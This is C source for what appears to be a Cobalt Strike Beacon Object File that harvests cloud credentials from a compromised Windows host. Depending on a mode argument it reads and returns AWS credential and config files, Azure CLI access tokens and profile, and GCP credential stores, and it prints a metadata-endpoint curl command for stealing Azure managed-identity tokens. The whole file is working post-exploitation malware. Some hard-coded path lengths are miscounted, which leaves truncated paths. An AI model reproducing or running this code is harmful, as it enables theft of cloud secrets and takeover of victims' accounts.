#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileSize(HANDLE, PDWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
DECLSPEC_IMPORT size_t WINAPI MSVCRT$strlen(const char*);
DECLSPEC_IMPORT int WINAPI MSVCRT$memcmp(const void*, const void*, size_t);
DECLSPEC_IMPORT void WINAPI MSVCRT$memcpy(void*, const void*, size_t);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int mode = BeaconDataInt(&parser);
    
    if (mode == 0) {
        // Read Azure identity credentials
        char path[MAX_PATH] = {0};
        KERNEL32$GetEnvironmentVariableA("MSI_ENDPOINT", path, MAX_PATH);
        if (!path[0]) {
            KERNEL32$GetEnvironmentVariableA("IDENTITY_ENDPOINT", path, MAX_PATH);
        }
        
        if (path[0]) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Azure Identity Endpoint: %s", path);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] No Azure identity endpoint found");
        }
        
        // Check for managed identity token
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Use curl to get token:");
        BeaconPrintf(CALLBACK_OUTPUT, "    curl -H \"Metadata: true\" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/");
    }
    else if (mode == 1) {
        // Read AWS credentials file
        char homePath[MAX_PATH] = {0};
        KERNEL32$GetEnvironmentVariableA("USERPROFILE", homePath, MAX_PATH);
        
        char credPath[MAX_PATH] = {0};
        if (homePath[0]) {
            MSVCRT$memcpy(credPath, homePath, MSVCRT$strlen(homePath));
            MSVCRT$memcpy(credPath + MSVCRT$strlen(homePath), "\\.aws\\credentials", 17);
        } else {
            MSVCRT$memcpy(credPath, "C:\\Users\\Administrator\\.aws\\credentials", 40);
        }
        
        HANDLE hFile = KERNEL32$CreateFileA(credPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
            if (fileSize > 0 && fileSize < 65536) {
                char buffer[65536] = {0};
                DWORD bytesRead = 0;
                KERNEL32$ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
                buffer[bytesRead] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "=== AWS Credentials ===");
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
            }
            KERNEL32$CloseHandle(hFile);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] No AWS credentials file found");
        }
        
        // Check config
        char configPath[MAX_PATH] = {0};
        if (homePath[0]) {
            MSVCRT$memcpy(configPath, homePath, MSVCRT$strlen(homePath));
            MSVCRT$memcpy(configPath + MSVCRT$strlen(homePath), "\\.aws\\config", 12);
        }
        
        hFile = KERNEL32$CreateFileA(configPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
            if (fileSize > 0 && fileSize < 65536) {
                char buffer[65536] = {0};
                DWORD bytesRead = 0;
                KERNEL32$ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
                buffer[bytesRead] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "=== AWS Config ===");
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
            }
            KERNEL32$CloseHandle(hFile);
        }
    }
    else if (mode == 2) {
        // Read Azure CLI tokens
        char homePath[MAX_PATH] = {0};
        KERNEL32$GetEnvironmentVariableA("USERPROFILE", homePath, MAX_PATH);
        
        char tokenPath[MAX_PATH] = {0};
        if (homePath[0]) {
            MSVCRT$memcpy(tokenPath, homePath, MSVCRT$strlen(homePath));
            MSVCRT$memcpy(tokenPath + MSVCRT$strlen(homePath), "\\.azure\\accessTokens.json", 24);
        }
        
        HANDLE hFile = KERNEL32$CreateFileA(tokenPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
            if (fileSize > 0 && fileSize < 131072) {
                char buffer[131072] = {0};
                DWORD bytesRead = 0;
                KERNEL32$ReadFile(hFile, buffer, fileSize < 131071 ? fileSize : 131071, &bytesRead, NULL);
                buffer[bytesRead] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "=== Azure Access Tokens ===");
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
            }
            KERNEL32$CloseHandle(hFile);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] No Azure access tokens found");
        }
        
        // Azure profile
        char profilePath[MAX_PATH] = {0};
        if (homePath[0]) {
            MSVCRT$memcpy(profilePath, homePath, MSVCRT$strlen(homePath));
            MSVCRT$memcpy(profilePath + MSVCRT$strlen(homePath), "\\.azure\\azureProfile.json", 24);
        }
        
        hFile = KERNEL32$CreateFileA(profilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
            if (fileSize > 0 && fileSize < 65536) {
                char buffer[65536] = {0};
                DWORD bytesRead = 0;
                KERNEL32$ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
                buffer[bytesRead] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "=== Azure Profile ===");
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
            }
            KERNEL32$CloseHandle(hFile);
        }
    }
    else if (mode == 3) {
        // GCP credentials
        char homePath[MAX_PATH] = {0};
        KERNEL32$GetEnvironmentVariableA("USERPROFILE", homePath, MAX_PATH);
        
        char gcpPath[MAX_PATH] = {0};
        if (homePath[0]) {
            MSVCRT$memcpy(gcpPath, homePath, MSVCRT$strlen(homePath));
            MSVCRT$memcpy(gcpPath + MSVCRT$strlen(homePath), "\\.config\\gcloud\\credentials.db", 28);
        }
        
        HANDLE hFile = KERNEL32$CreateFileA(gcpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
            if (fileSize > 0 && fileSize < 131072) {
                char buffer[131072] = {0};
                DWORD bytesRead = 0;
                KERNEL32$ReadFile(hFile, buffer, fileSize < 131071 ? fileSize : 131071, &bytesRead, NULL);
                buffer[bytesRead] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "=== GCP Credentials DB ===");
                BeaconPrintf(CALLBACK_OUTPUT, "[*] File found (%d bytes). Contains OAuth tokens and service account keys.", fileSize);
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Use: gcloud auth list && gcloud config list");
            }
            KERNEL32$CloseHandle(hFile);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] No GCP credentials found");
        }
        
        // Application default credentials
        char adcPath[MAX_PATH] = {0};
        if (homePath[0]) {
            MSVCRT$memcpy(adcPath, homePath, MSVCRT$strlen(homePath));
            MSVCRT$memcpy(adcPath + MSVCRT$strlen(homePath), "\\.config\\gcloud\\application_default_credentials.json", 50);
        }
        
        hFile = KERNEL32$CreateFileA(adcPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
            if (fileSize > 0 && fileSize < 65536) {
                char buffer[65536] = {0};
                DWORD bytesRead = 0;
                KERNEL32$ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
                buffer[bytesRead] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "=== GCP Application Default Credentials ===");
                BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
            }
            KERNEL32$CloseHandle(hFile);
        }
    }
}
